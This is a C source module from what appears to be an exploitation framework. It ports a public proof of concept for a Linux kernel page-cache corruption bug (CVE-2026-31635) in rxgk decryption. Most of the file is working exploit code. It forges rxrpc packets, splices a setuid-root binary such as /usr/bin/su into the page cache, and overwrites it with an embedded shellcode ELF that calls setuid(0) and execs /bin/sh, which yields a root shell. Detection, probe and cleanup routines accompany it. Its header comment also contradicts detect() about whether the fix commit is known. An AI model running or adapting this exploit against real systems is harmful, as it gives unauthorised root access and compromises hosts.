/*
 * dirtydecrypt_cve_2026_31635 — SKELETONKEY module
 *
 * DirtyDecrypt / DirtyCBC (CVE-2026-31635) — missing copy-on-write guard
 * in rxgk_decrypt_skb() (net/rxrpc/rxgk_common.h). rxgk_decrypt_skb()
 * does skb_to_sgvec() + crypto_krb5_decrypt() with no skb_cow_data();
 * the krb5enc AEAD template decrypts in-place BEFORE verifying the HMAC.
 * When skb frag pages are page-cache pages (spliced in via
 * MSG_SPLICE_PAGES over loopback), the in-place decrypt corrupts the
 * page cache of a read-only file. Sibling of Copy Fail / Dirty Frag.
 *
 * This module is a faithful port of the public V12 security PoC
 * (rxgk pagecache write, github.com/v12-security/pocs/dirtydecrypt,
 * Luna Tong / "cts"). The exploit primitive (the sliding-window
 * fire()/pagecache_write() machinery, the rxgk XDR token builder, the
 * 120-byte ET_DYN ELF) is reproduced from that PoC; see NOTICE.md.
 *
 * Port adaptations vs. the standalone PoC:
 *   - wrapped in the skeletonkey_module detect/exploit/cleanup interface
 *   - exploit() runs the PoC body in a forked child so the PoC's
 *     exit()/die() paths cannot tear down the skeletonkey dispatcher
 *   - honours ctx->no_shell (corrupt + verify, do not spawn the shell)
 *   - adds an --active sentinel probe that fires the primitive against
 *     a disposable /tmp file instead of a setuid binary
 *   - the on-disk binary is never written; cleanup() evicts the page
 *     cache (the corruption is a page-cache-only write)
 *
 * VERIFICATION STATUS: ported, NOT yet validated end-to-end on a
 * vulnerable-kernel VM. The fix commit for CVE-2026-31635 is not yet
 * pinned in this module, so detect() does not do a version-based
 * patched/vulnerable verdict — see detect() and MODULE.md.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/utsname.h>

#ifdef __linux__

/* _GNU_SOURCE / _FILE_OFFSET_BITS are passed via -D in the top-level
 * Makefile; do not redefine here (warning: redefined). */
#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <stdint.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <time.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>

#ifdef __has_include
#  if __has_include(<linux/rxrpc.h>)
#    include <linux/if.h>
#    include <linux/rxrpc.h>
#    include <linux/keyctl.h>
#  else
#    define DD_NEED_RXRPC_DEFS
#  endif
#else
#  include <linux/if.h>
#  include <linux/rxrpc.h>
#  include <linux/keyctl.h>
#endif

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif

#ifdef DD_NEED_RXRPC_DEFS
#define KEY_SPEC_PROCESS_KEYRING (-2)
#define RXRPC_SECURITY_KEY       1
#define RXRPC_MIN_SECURITY_LEVEL 4
#define RXRPC_SECURITY_ENCRYPT   2
#define RXRPC_USER_CALL_ID       1
struct sockaddr_rxrpc {
	unsigned short	srx_family;
	uint16_t	srx_service;
	uint16_t	transport_type;
	uint16_t	transport_len;
	union {
		unsigned short family;
		struct sockaddr_in sin;
		struct sockaddr_in6 sin6;
	} transport;
};
#endif

#define RXGK_SECURITY_INDEX 6
#define ENCTYPE_AES128_CTS  17
#define AES_KEY_LEN         16

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;
	uint16_t serviceId;
} __attribute__((packed));

#define RXRPC_PACKET_TYPE_DATA      1
#define RXRPC_PACKET_TYPE_CHALLENGE 6
#define RXRPC_LAST_PACKET           0x04

/* dd_verbose gates step/status chatter; errors always print. Set per
 * invocation from !ctx->json before any helper runs. */
static int dd_verbose = 1;
#define LOG(fmt, ...) do { if (dd_verbose) \
	fprintf(stderr, "[*] dirtydecrypt: " fmt "\n", ##__VA_ARGS__); } while (0)
#define ERR(fmt, ...) fprintf(stderr, "[-] dirtydecrypt: " fmt "\n", ##__VA_ARGS__)

/* Candidate setuid-root targets, in preference order. */
static const char *const dd_targets[] = {
	"/usr/bin/su", "/bin/su", "/usr/bin/mount",
	"/usr/bin/passwd", "/usr/bin/chsh", NULL
};

/* --- helpers (faithful to the V12 PoC) --- */

static long key_add(const char *type, const char *desc,
		    const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	int n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static void setup_ns(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		if (unshare(CLONE_NEWNET) < 0) {
			perror("unshare");
			_exit(4);
		}
	} else {
		write_proc("/proc/self/setgroups", "deny");
		char map[64];
		snprintf(map, sizeof(map), "0 %u 1", uid);
		write_proc("/proc/self/uid_map", map);
		snprintf(map, sizeof(map), "0 %u 1", gid);
		write_proc("/proc/self/gid_map", map);
	}

	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct ifreq ifr = {0};
		strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
		if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
			ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
			ioctl(s, SIOCSIFFLAGS, &ifr);
		}
		close(s);
	}
}

static void xdr_put32(uint8_t **pp, uint32_t val)
{
	uint32_t nv = htonl(val);
	memcpy(*pp, &nv, 4);
	*pp += 4;
}

static void xdr_put64(uint8_t **pp, uint64_t val)
{
	xdr_put32(pp, (uint32_t)(val >> 32));
	xdr_put32(pp, (uint32_t)(val & 0xFFFFFFFF));
}

static void xdr_put_data(uint8_t **pp, const void *data, size_t len)
{
	xdr_put32(pp, (uint32_t)len);
	memcpy(*pp, data, len);
	*pp += len;
	size_t pad = (4 - (len & 3)) & 3;
	if (pad) { memset(*pp, 0, pad); *pp += pad; }
}

static int build_rxgk_token(uint8_t *out, size_t maxlen,
			    const uint8_t *base_key, size_t keylen)
{
	uint8_t *p = out;
	struct timespec ts;
	clock_gettime(CLOCK_REALTIME, &ts);
	uint64_t now = (uint64_t)ts.tv_sec * 10000000ULL +
		       (uint64_t)ts.tv_nsec / 100ULL;

	xdr_put32(&p, 0);				/* flags */
	xdr_put_data(&p, "poc.test", 8);		/* cell */
	xdr_put32(&p, 1);				/* ntoken */

	uint8_t tok[512];
	uint8_t *tp = tok;
	xdr_put32(&tp, RXGK_SECURITY_INDEX);
	xdr_put64(&tp, now);				/* begintime */
	xdr_put64(&tp, now + 864000000000ULL);		/* endtime */
	xdr_put64(&tp, 2);				/* level = ENCRYPT */
	xdr_put64(&tp, 864000000000ULL);		/* lifetime */
	xdr_put64(&tp, 0);				/* bytelife */
	xdr_put64(&tp, ENCTYPE_AES128_CTS);		/* enctype */
	xdr_put_data(&tp, base_key, keylen);		/* key */
	uint8_t ticket[8] = {0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE};
	xdr_put_data(&tp, ticket, sizeof(ticket));

	size_t toklen = (size_t)(tp - tok);
	xdr_put32(&p, (uint32_t)toklen);
	memcpy(p, tok, toklen);
	p += toklen;

	if ((size_t)(p - out) > maxlen) return -1;
	return (int)(p - out);
}

static long add_rxgk_key(const char *desc, const uint8_t *base_key, size_t keylen)
{
	uint8_t buf[1024];
	int n = build_rxgk_token(buf, sizeof(buf), base_key, keylen);
	if (n < 0) return -1;
	return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0) return -1;

	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
		       keyname, strlen(keyname)) < 0) {
		close(fd); return -1;
	}
	int min_level = RXRPC_SECURITY_ENCRYPT;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
		       &min_level, sizeof(min_level)) < 0) {
		close(fd); return -1;
	}

	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
		close(fd); return -1;
	}
	return fd;
}

static int initiate_call(int cli_fd, uint16_t srv_port, uint16_t service_id)
{
	char data[] = "TESTDATA";
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg = {0};
	msg.msg_name = &srx;
	msg.msg_namelen = sizeof(srx);
	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf;
	msg.msg_controllen = sizeof(cmsg_buf);
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = 0xDEAD;

	int fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
	ssize_t n = sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);

	if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK)
		return -1;
	return 0;
}

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) return -1;
	struct sockaddr_in sa = {
		.sin_family = AF_INET,
		.sin_port = htons(port),
		.sin_addr.s_addr = htonl(0x7F000001),
	};
	int one = 1;
	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(s); return -1;
	}
	return s;
}

static ssize_t udp_recv(int s, void *buf, size_t cap,
			struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
	socklen_t fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0, (struct sockaddr *)from, from ? &fl : NULL);
}

static int dd_trigger_seq = 0;

/*
 * Fire one splice-based page-cache corruption at the given file offset.
 * Returns 1 on fire, -1 on setup error.
 */
static int fire(int target_fd, off_t splice_off, size_t splice_len,
		const uint8_t *base_key, size_t keylen)
{
	char keyname[32];
	snprintf(keyname, sizeof(keyname), "rxgk%d", dd_trigger_seq++);

	long key = add_rxgk_key(keyname, base_key, keylen);
	if (key < 0) return -1;

	uint16_t port_S = 10000 + (rand() % 27000) * 2;
	uint16_t port_C = port_S + 1;
	int ret = -1;

	int udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0) goto out_key;

	int cli = setup_rxrpc_client(port_C, keyname);
	if (cli < 0) goto out_udp;

	if (initiate_call(cli, port_S, 1234) < 0)
		goto out_cli;

	uint8_t pkt[2048];
	struct sockaddr_in cli_addr;
	ssize_t n = udp_recv(udp_srv, pkt, sizeof(pkt), &cli_addr, 50);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) goto out_cli;

	struct rxrpc_wire_header *hdr = (struct rxrpc_wire_header *)pkt;
	uint32_t epoch = ntohl(hdr->epoch);
	uint32_t cid   = ntohl(hdr->cid);
	uint32_t callN = ntohl(hdr->callNumber);
	uint16_t svc   = ntohs(hdr->serviceId);
	uint16_t cport = ntohs(cli_addr.sin_port);

	/* send challenge */
	{
		uint8_t ch[sizeof(struct rxrpc_wire_header) + 20];
		memset(ch, 0, sizeof(ch));
		struct rxrpc_wire_header *c = (struct rxrpc_wire_header *)ch;
		c->epoch = htonl(epoch);
		c->cid = htonl(cid);
		c->serial = htonl(0x10000);
		c->type = RXRPC_PACKET_TYPE_CHALLENGE;
		c->securityIndex = RXGK_SECURITY_INDEX;
		c->serviceId = htons(svc);
		for (int i = 0; i < 20; i++)
			ch[sizeof(struct rxrpc_wire_header) + i] = rand() & 0xFF;
		struct sockaddr_in to = { .sin_family = AF_INET,
			.sin_port = htons(cport),
			.sin_addr.s_addr = htonl(0x7F000001) };
		sendto(udp_srv, ch, sizeof(ch), 0,
		       (struct sockaddr *)&to, sizeof(to));
	}

	/* drain response(s) */
	for (int i = 0; i < 3; i++) {
		struct sockaddr_in src;
		if (udp_recv(udp_srv, pkt, sizeof(pkt), &src, 5) < 0) break;
	}

	/* forge DATA packet: wire header from userspace, payload from page cache */
	struct rxrpc_wire_header mal = {0};
	mal.epoch = htonl(epoch);
	mal.cid = htonl(cid);
	mal.callNumber = htonl(callN);
	mal.seq = htonl(1);
	mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA;
	mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = RXGK_SECURITY_INDEX;
	mal.serviceId = htons(svc);

	struct sockaddr_in dst = { .sin_family = AF_INET,
		.sin_port = htons(cport),
		.sin_addr.s_addr = htonl(0x7F000001) };
	if (connect(udp_srv, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		goto out_cli;

	int p[2];
	if (pipe(p) < 0) goto out_cli;
	struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
	if (vmsplice(p[1], &viv, 1, 0) < 0)
		{ close(p[0]); close(p[1]); goto out_cli; }
	loff_t off = splice_off;
	if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0)
		{ close(p[0]); close(p[1]); goto out_cli; }
	if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0)
		{ close(p[0]); close(p[1]); goto out_cli; }
	close(p[0]); close(p[1]);

	usleep(1000);

	/* drain the error from the client socket (HMAC check fails as expected) */
	int fl = fcntl(cli, F_GETFL);
	fcntl(cli, F_SETFL, fl | O_NONBLOCK);
	for (int i = 0; i < 2; i++) {
		char rb[2048]; struct sockaddr_rxrpc srx; char ccb[256];
		struct msghdr m = {0};
		struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
		m.msg_iov = &iv; m.msg_iovlen = 1;
		m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
		recvmsg(cli, &m, 0);
	}
	ret = 1;

out_cli:
	close(cli);
out_udp:
	close(udp_srv);
out_key:
	syscall(SYS_keyctl, 9 /* KEYCTL_UNLINK */, key, KEY_SPEC_PROCESS_KEYRING);
	syscall(SYS_keyctl, 21 /* KEYCTL_INVALIDATE */, key);
	return ret;
}

/* --- sliding-window write with progress display --- */

static void dd_progress(int done, int total, int fires)
{
	if (!dd_verbose) return;
	int width = 40;
	int filled = total ? (done * width / total) : 0;
	int pct = total ? (done * 100 / total) : 0;
	fprintf(stderr, "\r    [");
	for (int j = 0; j < width; j++)
		fputc(j < filled ? '=' : (j == filled ? '>' : ' '), stderr);
	fprintf(stderr, "] %3d%% (%d/%d, %d fires)", pct, done, total, fires);
	if (done == total) fputc('\n', stderr);
	fflush(stderr);
}

static int pagecache_write(int rfd, void *map, off_t base,
			   const uint8_t *target, int len, off_t file_size,
			   const char *label)
{
	uint8_t key[16];
	uint64_t seed = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
	int total = 0;

	int max_off = (int)(file_size - 28);
	if (base + len - 1 > max_off)
		len = max_off - (int)base + 1;

	/* Find first byte that differs. We must write everything from there
	 * onward — each round's 15-byte damage zone corrupts the next bytes. */
	int start = 0;
	for (int i = 0; i < len; i++) {
		uint8_t cur;
		pread(rfd, &cur, 1, base + i);
		if (cur != target[i]) { start = i; break; }
		if (i == len - 1) {
			LOG("page cache already matches, skipping write");
			return 0;
		}
	}
	int need = len - start;

	LOG("writing payload to %s (%d bytes from offset %d)",
	    label, need, (int)base + start);
	dd_progress(0, need, 0);

	for (int i = start; i < len; i++) {
		off_t off = base + i;
		uint8_t want = target[i];
		uint8_t cur;
		pread(rfd, &cur, 1, off);

		if (cur == want && i > start)
			continue;

		int ok = 0;
		for (int att = 0; att < 10000; att++) {
			seed ^= seed << 13; seed ^= seed >> 7; seed ^= seed << 17;
			uint64_t r = seed;
			seed ^= seed << 13; seed ^= seed >> 7; seed ^= seed << 17;
			memcpy(key, &r, 8);
			memcpy(key + 8, &seed, 8);

			size_t slen = 28;
			if (off + (off_t)slen > file_size) slen = file_size - off;
			if (slen < 16) slen = 16;
			int rc = fire(rfd, off, slen, key, AES_KEY_LEN);
			total++;
			if (rc == 1 && ((const uint8_t *)map)[off] == want) {
				ok = 1;
				dd_progress(i - start + 1, need, total);
				break;
			}
		}
		if (!ok) {
			if (dd_verbose) fprintf(stderr, "\n");
			ERR("byte %d/%d failed", i - start + 1, need);
			return -1;
		}
	}

	LOG("%d fires total", total);
	return 0;
}

/* --- tiny ELF: setuid(0) + execve("/bin/sh") ---
 * 120-byte ET_DYN ELF with overlapping phdr+header and /bin/sh in p_paddr.
 * Reproduced verbatim from the V12 PoC. */
static const uint8_t tiny_elf[] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x03,0x00,0x3e,0x00,0x01,0x00,0x00,0x00, 0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00, 0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* code: */
	0xb0,0x69,0x0f,0x05,                      /* setuid(0) */
	0x48,0x8d,0x3d,0xdd,0xff,0xff,0xff,       /* lea rdi, "/bin/sh" */
	0x6a,0x3b,0x58,                            /* push 59; pop rax */
	0x0f,0x05,                                 /* execve("/bin/sh", 0, 0) */
};

/* Pick the first readable setuid-root binary from the candidate list. */
static const char *dd_pick_target(void)
{
	for (int i = 0; dd_targets[i]; i++) {
		struct stat sb;
		if (stat(dd_targets[i], &sb) == 0 &&
		    (sb.st_mode & S_ISUID) && sb.st_uid == 0 &&
		    access(dd_targets[i], R_OK) == 0)
			return dd_targets[i];
	}
	return NULL;
}

/* Best-effort page-cache eviction for one path. */
static void dd_evict(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd >= 0) {
#ifdef POSIX_FADV_DONTNEED
		posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
#endif
		close(fd);
	}
	int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);
	if (dc >= 0) { if (write(dc, "3\n", 2) < 0) {} close(dc); }
}

/* ---- detect ------------------------------------------------------- */

/*
 * Active sentinel probe: fire the rxgk primitive against a disposable
 * /tmp file and check whether the page cache was corrupted. Never
 * touches a setuid binary. Returns 1 vulnerable, 0 not, -1 probe error.
 */
static int dd_active_probe(void)
{
	char probe[] = "/tmp/skeletonkey-dirtydecrypt-probe-XXXXXX";
	int fd = mkstemp(probe);
	if (fd < 0) return -1;
	uint8_t seed_buf[256];
	for (int i = 0; i < (int)sizeof(seed_buf); i++) seed_buf[i] = 0xA5;
	if (write(fd, seed_buf, sizeof seed_buf) != (ssize_t)sizeof seed_buf) {
		close(fd); unlink(probe); return -1;
	}
	fsync(fd);
	close(fd);

	int rfd = open(probe, O_RDONLY);
	if (rfd < 0) { unlink(probe); return -1; }
	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd, 0);
	if (map == MAP_FAILED) { close(rfd); unlink(probe); return -1; }

	int result = -1;
	pid_t pid = fork();
	if (pid == 0) {
		setup_ns();
		usleep(10000);
		int s = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
		if (s < 0) _exit(2);    /* AF_RXRPC unavailable */
		close(s);
		uint8_t key[16];
		for (int att = 0; att < 64; att++) {
			for (int k = 0; k < 16; k++) key[k] = rand() & 0xff;
			if (fire(rfd, 16, 28, key, AES_KEY_LEN) != 1)
				continue;
			/* corruption hits a 16-byte block at the offset */
			for (int b = 16; b < 32; b++)
				if (((const uint8_t *)map)[b] != 0xA5)
					_exit(0);   /* vulnerable */
		}
		_exit(1);                       /* primitive did not land */
	}
	if (pid > 0) {
		int st;
		waitpid(pid, &st, 0);
		if (WIFEXITED(st)) {
			if (WEXITSTATUS(st) == 0) result = 1;
			else if (WEXITSTATUS(st) == 1) result = 0;
			else result = -1;   /* AF_RXRPC unavailable / error */
		}
	}
	munmap(map, 4096);
	close(rfd);
	unlink(probe);
	return result;
}

/*
 * CVE-2026-31635 affects kernels with the rxgk RESPONSE-handling code
 * (CONFIG_RXGK). Per Debian's tracker, the vulnerable code was
 * introduced in the 7.0 development cycle — older mainline branches
 * (bullseye 5.10 / bookworm 6.1 / trixie 6.12) are <not-affected,
 * vulnerable code not present>. The fix is upstream commit
 * a2567217ade970ecc458144b6be469bc015b23e5 ("rxrpc: fix oversized
 * RESPONSE authenticator length check"), shipped in Linux 7.0.
 *
 * The detect logic therefore is:
 *   - kernel < 7.0  → SKELETONKEY_OK (predates the bug)
 *   - kernel ≥ 7.0  → consult kernel_range; 7.0+ has the fix
 *   - --active     → empirical override (catches pre-fix 7.0-rc kernels
 *                    or weird distro rebuilds the version check missed)
 */
static const struct kernel_patched_from dirtydecrypt_patched_branches[] = {
	{7, 0, 0},   /* mainline fix commit a2567217 landed in Linux 7.0 */
};
static const struct kernel_range dirtydecrypt_range = {
	.patched_from = dirtydecrypt_patched_branches,
	.n_patched_from = sizeof(dirtydecrypt_patched_branches) /
			  sizeof(dirtydecrypt_patched_branches[0]),
};

static skeletonkey_result_t dd_detect(const struct skeletonkey_ctx *ctx)
{
	dd_verbose = !ctx->json;

	/* Consult the shared host fingerprint instead of calling
	 * kernel_version_current() ourselves — populated once at startup
	 * and identical across every module's detect(). */
	const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
	if (!v || v->major == 0) {
		if (!ctx->json)
			fprintf(stderr, "[!] dirtydecrypt: host fingerprint missing kernel "
				"version — bailing\n");
		return SKELETONKEY_TEST_ERROR;
	}

	/* Predates the bug: rxgk RESPONSE-handling code was added in 7.0. */
	if (!skeletonkey_host_kernel_at_least(ctx->host, 7, 0, 0)) {
		if (!ctx->json)
			fprintf(stderr, "[i] dirtydecrypt: kernel %s predates the rxgk "
				"RESPONSE-handling code added in 7.0 — not applicable\n",
				v->release);
		return SKELETONKEY_OK;
	}

	/* Precondition: AF_RXRPC must be reachable for the primitive. */
	int s = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (s < 0) {
		if (!ctx->json)
			fprintf(stderr, "[i] dirtydecrypt: AF_RXRPC unavailable "
				"(%s) — rxgk path not reachable here\n",
				strerror(errno));
		return SKELETONKEY_PRECOND_FAIL;
	}
	close(s);

	if (!dd_pick_target()) {
		if (!ctx->json)
			fprintf(stderr, "[i] dirtydecrypt: no readable setuid-root "
				"binary — exploit has no carrier here\n");
		return SKELETONKEY_PRECOND_FAIL;
	}

	bool patched_by_version = kernel_range_is_patched(&dirtydecrypt_range, v);

	if (ctx->active_probe) {
		if (!ctx->json)
			fprintf(stderr, "[*] dirtydecrypt: running active sentinel "
				"probe (safe; /tmp only)\n");
		int p = dd_active_probe();
		if (p == 1) {
			if (!ctx->json)
				fprintf(stderr, "[!] dirtydecrypt: ACTIVE PROBE "
					"CONFIRMED — rxgk in-place decrypt corrupts "
					"the page cache (kernel %s)\n", v->release);
			return SKELETONKEY_VULNERABLE;
		}
		if (p == 0) {
			if (!ctx->json)
				fprintf(stderr, "[+] dirtydecrypt: active probe did "
					"not land — primitive blocked (likely patched%s)\n",
					patched_by_version ? "" : ", or distro silently fixed");
			return SKELETONKEY_OK;
		}
		if (!ctx->json)
			fprintf(stderr, "[?] dirtydecrypt: active probe machinery "
				"failed; falling back to version verdict\n");
	}

	if (patched_by_version) {
		if (!ctx->json)
			fprintf(stderr, "[+] dirtydecrypt: kernel %s is patched "
				"(commit a2567217 in Linux 7.0; version-only check — "
				"use --active to confirm)\n", v->release);
		return SKELETONKEY_OK;
	}
	if (!ctx->json)
		fprintf(stderr, "[!] dirtydecrypt: kernel %s appears VULNERABLE "
			"(in 7.0-rc window before commit a2567217; version-only)\n"
			"    Confirm empirically: skeletonkey --scan --active\n",
			v->release);
	return SKELETONKEY_VULNERABLE;
}

/* ---- exploit ------------------------------------------------------ */

/* Runs in a forked child: corrupt the target's page cache, then either
 * exec it (shell mode) or _exit cleanly (no_shell). Never returns on
 * the shell path. Exit codes: 0 ok, 2 corruption failed, 4 precond. */
static void dd_child(const char *target_path, int no_shell)
{
	int rfd = open(target_path, O_RDONLY);
	if (rfd < 0) { perror("open target"); _exit(2); }
	struct stat sb;
	if (fstat(rfd, &sb) < 0) { perror("fstat"); _exit(2); }

	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd, 0);
	if (map == MAP_FAILED) { perror("mmap"); _exit(2); }

	pid_t pid = fork();
	if (pid < 0) { perror("fork"); _exit(2); }
	if (pid == 0) {
		setup_ns();
		usleep(10000);
		int sock = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
		if (sock < 0) { ERR("AF_RXRPC unavailable"); _exit(4); }
		close(sock);
		_exit(pagecache_write(rfd, map, 0, tiny_elf, sizeof(tiny_elf),
				      sb.st_size, target_path) < 0 ? 2 : 0);
	}
	int st;
	waitpid(pid, &st, 0);
	munmap(map, 4096);
	close(rfd);
	if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
		ERR("page-cache corruption failed (status 0x%x)", st);
		_exit(WIFEXITED(st) && WEXITSTATUS(st) == 4 ? 4 : 2);
	}

	if (no_shell) {
		LOG("--no-shell: page cache poisoned, shell not spawned");
		LOG("revert with `skeletonkey --cleanup dirtydecrypt`");
		_exit(0);
	}

	LOG("page cache poisoned; exec %s to claim root", target_path);
	fflush(NULL);
	execlp(target_path, target_path, (char *)NULL);
	perror("execlp target");
	_exit(2);
}

static skeletonkey_result_t dd_exploit(const struct skeletonkey_ctx *ctx)
{
	dd_verbose = !ctx->json;

	if (geteuid() == 0) {
		fprintf(stderr, "[i] dirtydecrypt: already root — nothing to do\n");
		return SKELETONKEY_OK;
	}

	const char *target = dd_pick_target();
	if (!target) {
		ERR("no readable setuid-root binary to use as a carrier");
		return SKELETONKEY_PRECOND_FAIL;
	}
	LOG("target carrier: %s", target);

	/* Record the target so cleanup() knows what to evict. */
	int sf = open("/tmp/skeletonkey-dirtydecrypt.target",
		      O_WRONLY | O_CREAT | O_TRUNC, 0600);
	if (sf >= 0) { if (write(sf, target, strlen(target)) < 0) {} close(sf); }

	srand(time(NULL) ^ getpid());

	pid_t pid = fork();
	if (pid < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
	if (pid == 0)
		dd_child(target, ctx->no_shell);   /* never returns on shell path */

	int st;
	waitpid(pid, &st, 0);
	if (!WIFEXITED(st))
		return SKELETONKEY_EXPLOIT_FAIL;
	switch (WEXITSTATUS(st)) {
	case 0:  return SKELETONKEY_EXPLOIT_OK;
	case 4:  return SKELETONKEY_PRECOND_FAIL;
	default: return SKELETONKEY_EXPLOIT_FAIL;
	}
}

/* ---- cleanup ------------------------------------------------------ */

static skeletonkey_result_t dd_cleanup(const struct skeletonkey_ctx *ctx)
{
	dd_verbose = !ctx->json;

	char target[256] = {0};
	int sf = open("/tmp/skeletonkey-dirtydecrypt.target", O_RDONLY);
	if (sf >= 0) {
		ssize_t n = read(sf, target, sizeof(target) - 1);
		if (n > 0) target[n] = '\0';
		close(sf);
	}

	if (target[0]) {
		LOG("evicting %s from page cache", target);
		dd_evict(target);
		unlink("/tmp/skeletonkey-dirtydecrypt.target");
	} else {
		LOG("no recorded target; evicting all candidate carriers");
		for (int i = 0; dd_targets[i]; i++)
			dd_evict(dd_targets[i]);
	}
	return SKELETONKEY_OK;
}

#else  /* !__linux__ */

static skeletonkey_result_t dd_detect(const struct skeletonkey_ctx *ctx)
{
	if (!ctx->json)
		fprintf(stderr, "[i] dirtydecrypt: Linux-only module "
			"(AF_RXRPC / rxgk) — not applicable on this platform\n");
	return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dd_exploit(const struct skeletonkey_ctx *ctx)
{
	(void)ctx;
	fprintf(stderr, "[-] dirtydecrypt: Linux-only module — cannot run here\n");
	return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dd_cleanup(const struct skeletonkey_ctx *ctx)
{
	(void)ctx;
	return SKELETONKEY_OK;
}
